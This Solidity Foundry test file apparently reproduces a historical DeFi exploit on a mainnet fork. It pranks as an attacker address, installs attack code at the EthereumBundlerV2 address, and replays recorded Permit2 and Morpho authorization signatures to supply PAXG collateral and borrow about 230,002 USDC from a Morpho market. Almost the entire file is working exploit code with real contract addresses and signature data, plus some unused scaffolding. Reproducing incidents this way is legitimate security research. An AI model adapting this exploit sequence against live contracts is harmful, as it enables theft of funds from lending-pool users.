
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.EthereumBundlerV2;
    uint256 constant FORK_BLOCK = 20956051;
    uint256 constant TX_TIMESTAMP = 1728815255;
    uint256 constant TX_BLOCK_NUMBER = 20956052;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 230002486670);
    }
}

contract OurAttack {








    function attack() external payable {
        _attack();
    }

    function _callback() internal {
        _markCallback(0);
        uint256 paxgBalanceOfAttackerEoa = IERC20Like(Addresses.PAXG).balanceOf(Addresses.attacker_eoa);
        IPermit2(Addresses.Permit2)
            .transferFrom(
                Addresses.attacker_eoa, address(this), uint160(paxgBalanceOfAttackerEoa), Addresses.PAXG
            );
    }

    function _callback2() internal {
        _markCallback(1);
        IMorpho(Addresses.Morpho)
            .borrow(
                Abi_borrow_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.PAXG,
                    field2: 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 915000000000000000
                }),
                230002486670,
                0,
                Addresses.attacker_eoa,
                Addresses.attacker_eoa
            );
    }

    function _attack() internal {
        bytes[] memory replayCalls = new bytes[](5);
        bytes memory approve2Proof =
            hex"da8cabf58b375be5b548f1f0dc1af63264ab2676dee4876f25ee4087a888080018214b72ff8215788e1adc64eded9048c30d599a0201550b8eaf2038b263feb41c";
        replayCalls[0] = abi.encodeWithSignature(
            "approve2(((address,uint160,uint48,uint48),address,uint256),bytes,bool)",
            Abi_approve2_Param0({
                field0: Abi_approve2_Param0_Field0({
                    field0: Addresses.PAXG, field1: 132577813003136114, field2: 281474976710655, field3: 0
                }),
                field1: Addresses.EthereumBundlerV2,
                field2: 1728901150
            }),
            approve2Proof,
            true
        );
        replayCalls[1] =
            abi.encodeWithSignature("transferFrom2(address,uint256)", Addresses.PAXG, 132577813003136114);
        replayCalls[2] = abi.encodeWithSignature(
            "morphoSupplyCollateral((address,address,address,address,uint256),uint256,address,bytes)",
            Abi_morphoSupplyCollateral_Param0({
                field0: Addresses.USDC,
                field1: Addresses.PAXG,
                field2: 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 915000000000000000
            }),
            132577813003136114,
            Addresses.attacker_eoa,
            hex""
        );
        replayCalls[3] = abi.encodeWithSignature(
            "morphoSetAuthorizationWithSig((address,address,bool,uint256,uint256),(uint8,bytes32,bytes32),bool)",
            Abi_morphoSetAuthorizationWithSig_Param0({
                field0: Addresses.attacker_eoa,
                field1: Addresses.EthereumBundlerV2,
                field2: true,
                field3: 0,
                field4: 1728901150
            }),
            Abi_morphoSetAuthorizationWithSig_Param1({
                field0: 27,
                field1: bytes32(hex"2dff2f5008b6acb3c7854806df5453424ac47b9e864f249ddf6ca024cc7f33b2"),
                field2: bytes32(hex"1fb71a45f94532d18f292f428c9a3f21c052bf2964974c1fc5c4ddfa1f4bdd34")
            }),
            true
        );
        replayCalls[4] = abi.encodeWithSignature(
            "morphoBorrow((address,address,address,address,uint256),uint256,uint256,uint256,address)",
            Abi_morphoBorrow_Param0({
                field0: Addresses.USDC,
                field1: Addresses.PAXG,
                field2: 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 915000000000000000
            }),
            230002486670,
            0,
            226898039801385921,
            Addresses.attacker_eoa
        );
        for (uint256 i = 0; i < replayCalls.length; i++) {
            (bool ok, bytes memory result) = address(this).delegatecall(replayCalls[i]);
            if (!ok) assembly { revert(add(result, 32), mload(result)) }
        }
    }

    function _callback3() internal {
        _markCallback(3);
        {
            bytes memory permitProof =
                hex"da8cabf58b375be5b548f1f0dc1af63264ab2676dee4876f25ee4087a888080018214b72ff8215788e1adc64eded9048c30d599a0201550b8eaf2038b263feb41c";
            IPermit2(Addresses.Permit2)
                .permit(
                    Addresses.attacker_eoa,
                    Abi_permit_Param1({
                        field0: Abi_permit_Param1_Field0({
                            field0: Addresses.PAXG, field1: 132577813003136114, field2: 281474976710655, field3: 0
                        }),
                        field1: address(this),
                        field2: 1728901150
                    }),
                    permitProof
                );
        }
    }

    function _callback4() internal {
        _markCallback(4);
    }

    function _callback5() internal {
        _markCallback(5);
        IMorpho(Addresses.Morpho)
            .setAuthorizationWithSig(
                Abi_setAuthorizationWithSig_Param0({
                    field0: Addresses.attacker_eoa,
                    field1: address(this),
                    field2: true,
                    field3: 0,
                    field4: 1728901150
                }),
                Abi_setAuthorizationWithSig_Param1({
                    field0: 27,
                    field1: bytes32(hex"2dff2f5008b6acb3c7854806df5453424ac47b9e864f249ddf6ca024cc7f33b2"),
                    field2: bytes32(hex"1fb71a45f94532d18f292f428c9a3f21c052bf2964974c1fc5c4ddfa1f4bdd34")
                })
            );
    }

    function _callback6() internal {
        _markCallback(6);
        IERC20Like(Addresses.PAXG).allowance(address(this), Addresses.Morpho);
        IMorpho(Addresses.Morpho)
            .supplyCollateral(
                Abi_supplyCollateral_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.PAXG,
                    field2: 0xDd1778F71a4a1C6A0eFebd8AE9f8848634CE1101,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 915000000000000000
                }),
                132577813003136114,
                Addresses.attacker_eoa,
                hex""
            );
    }

    receive() external payable {}

    function transferFrom2(address arg0, uint256 amount) external payable {
        arg0;
        amount;
        _callback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function morphoBorrow(
        Abi_morphoBorrow_Param0 calldata arg0,
        uint256 amount,
        uint256 amount1,
        uint256 amount2,
        address arg4
    ) external payable {
        arg0;
        amount;
        amount1;
        amount2;
        arg4;
        _callback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function multicall(bytes[] calldata arg0) external payable {
        arg0;
        _attack();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function approve2(Abi_approve2_Param0 calldata arg0, bytes calldata arg1, bool arg2) external payable {
        arg0;
        arg1;
        arg2;
        _callback3();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function onMorphoSupplyCollateral(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        return;
    }

    function morphoSetAuthorizationWithSig(
        Abi_morphoSetAuthorizationWithSig_Param0 calldata arg0,
        Abi_morphoSetAuthorizationWithSig_Param1 calldata arg1,
        bool arg2
    ) external payable {
        arg0;
        arg1;
        arg2;
        _callback5();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function morphoSupplyCollateral(
        Abi_morphoSupplyCollateral_Param0 calldata arg0,
        uint256 amount,
        address arg2,
        bytes calldata arg3
    ) external payable {
        arg0;
        amount;
        arg2;
        arg3;
        _callback6();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address internal constant attacker_eoa = 0x02DBE46169fDf6555F2A125eEe3dce49703b13f5;
    address internal constant SimpleMultiSig = 0x38699d04656fF537ef8671b6b595402ebDBdf6f4;
    address internal constant EthereumBundlerV2 = 0x4095F064B8d3c3548A3bebfd0Bbfd04750E30077;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address internal constant PAXG_E42A = 0x74271F2282eD7eE35c166122A60c9830354be42a;
    address internal constant AdaptiveCurveIrm = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
}

struct Abi_borrow_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_approve2_Param0_Field0 {
    address field0;
    uint160 field1;
    uint48 field2;
    uint48 field3;
}

struct Abi_approve2_Param0 {
    Abi_approve2_Param0_Field0 field0;
    address field1;
    uint256 field2;
}

struct Abi_morphoSupplyCollateral_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_morphoSetAuthorizationWithSig_Param0 {
    address field0;
    address field1;
    bool field2;
    uint256 field3;
    uint256 field4;
}

struct Abi_morphoSetAuthorizationWithSig_Param1 {
    uint8 field0;
    bytes32 field1;
    bytes32 field2;
}

struct Abi_morphoBorrow_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

struct Abi_permit_Param1_Field0 {
    address field0;
    uint160 field1;
    uint48 field2;
    uint48 field3;
}

struct Abi_permit_Param1 {
    Abi_permit_Param1_Field0 field0;
    address field1;
    uint256 field2;
}

struct Abi_setAuthorizationWithSig_Param0 {
    address field0;
    address field1;
    bool field2;
    uint256 field3;
    uint256 field4;
}

struct Abi_setAuthorizationWithSig_Param1 {
    uint8 field0;
    bytes32 field1;
    bytes32 field2;
}

struct Abi_supplyCollateral_Param0 {
    address field0;
    address field1;
    address field2;
    address field3;
    uint256 field4;
}

interface IMorpho {
    function borrow(Abi_borrow_Param0 calldata, uint256, uint256, address, address) external;
    function setAuthorizationWithSig(
        Abi_setAuthorizationWithSig_Param0 calldata,
        Abi_setAuthorizationWithSig_Param1 calldata
    ) external;
    function supplyCollateral(Abi_supplyCollateral_Param0 calldata, uint256, address, bytes calldata) external;
}

interface IPermit2 {
    function permit(address, Abi_permit_Param1 calldata, bytes calldata) external;
    function transferFrom(address, address, uint160, address) external;
}
